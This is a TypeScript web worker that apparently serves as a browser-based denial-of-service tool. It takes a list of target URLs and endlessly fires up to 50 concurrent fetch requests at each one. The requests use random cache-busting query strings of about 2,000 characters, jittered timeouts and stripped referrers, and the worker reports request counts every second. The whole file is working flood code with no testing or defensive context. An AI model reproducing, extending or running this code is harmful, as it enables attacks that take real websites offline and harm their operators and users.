/* eslint no-restricted-globals: 0 */
const REPORT_INTERVAL = 1000
const REQUEST_TIMEOUT_BASE = 500
const CONCURRENCY = 50
const PAYLOAD_SIZE = 2_000

const generateRandomString = (nChars: number) => {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let result = ''
  for (let i = 0; i < nChars; i++) {
    result += alphabet.charAt(Math.floor(Math.random() * alphabet.length))
  }

  return result
}

const sendRequest = async (target: string, timeout: number) => {
  const controller = new AbortController()
  const timeoutId = setTimeout(() => controller.abort(), timeout)
  try {
    await fetch(target, {
      mode: 'no-cors',
      cache: 'no-store',
      referrerPolicy: 'no-referrer',
      signal: controller.signal
    })
    clearTimeout(timeoutId)
  } catch (e) {
    clearTimeout(timeoutId)
  }
}

self.addEventListener(
  'message',
  async (e: MessageEvent<{ type: string; threads: number; url: string }>) => {
    if (e.data.type !== 'init') return
    const targets = e.data.url
      .split(',')
      .map(target => `https:${target.replace(/\s/, '').replace(/http(s?):/, '')}`)

    let nRequests = 0n
    let payload = generateRandomString(PAYLOAD_SIZE)

    setInterval(() => {
      payload = generateRandomString(PAYLOAD_SIZE + Math.round(Math.random() * 100) * 2 - 100)
      self.postMessage(nRequests)
      nRequests = 0n
    }, REPORT_INTERVAL)

    const queue = []

    while (true) {
      if (queue.length >= CONCURRENCY) {
        await queue[0]
        queue[0] = null
        queue.shift()
        continue
      }

      const timeoutRand = Math.round(Math.random() * 100) - 50
      targets.forEach(target => {
        queue.push(
          sendRequest(
            target.includes('?') ? target : `${target}?${payload.toString()}${Math.random()}`,
            REQUEST_TIMEOUT_BASE + timeoutRand
          )
        )
        nRequests++
      })
    }
  },
  false
)
